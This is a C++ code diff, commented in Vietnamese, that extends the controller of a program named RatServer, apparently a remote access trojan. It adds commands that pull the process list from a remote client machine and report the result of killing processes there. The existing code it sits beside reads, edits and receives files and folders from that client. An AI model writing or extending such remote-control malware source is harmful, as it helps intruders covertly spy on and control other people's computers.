@@ -235,6 +235,12 @@ void RatServer::HandleCommand(const std::string& input) {
         std::string foldername = input.substr(7);
         downloadManager.ReceiveFolder(foldername); // Hàm nhận folder mới
     }
+    else if (input == "PS") { // Xử lý nhận danh sách tiến trình
+        ListProcess();
+    }
+    else if (input.rfind("KILL ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh KILL
+        ReceiveStatus();
+    }
     else if (input.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý EDITFILE
         std::string filename = input.substr(9);
         SendFileContent(filename);
@@ -259,6 +265,20 @@ void RatServer::ListFile() {
 
     std::cout << "\n--- Danh sach file cua Client ---\n";
     std::cout << response << std::endl;
+}
+
+void RatServer::ListProcess() {
+    std::cout << "[*] Dang tai danh sach tien trinh..." << std::endl;
+            
+    // Đặt timeout ngắn (1 giây) để nhận biết khi Client dừng gửi dữ liệu
+    DWORD timeout = 1000; 
+    auto psResult = client.ReceiveUntilTimeout(timeout);
+    
+    if (!psResult.empty()) {
+        std::cout << psResult << std::endl;
+    } else {
+        std::cout << "[-] Khong nhan duoc du lieu hoac thoi gian cho qua lau.\n";
+    }
 }
 
 std::string SocketClient::ReceiveUntilTimeout(DWORD timeout) {
@@ -303,6 +323,16 @@ void RatServer::SendFileContent(std::string& filename) {
         std::cout << "[*] Ket qua tu Client: " << response;
     } else {
         std::cout << "[-] Client khong san sang. Phan hoi: " << clientSignal << std::endl;
+    }
+}
+
+void RatServer::ReceiveStatus() {
+    auto response = client.Receive();
+
+    if(response.empty())
+        std::cout << "[-] Khong nhan duoc phan hoi tu Client.\n";
+    else {
+        std::cout << "[*] Ket qua tu Client: " << response;
     }
 }
 
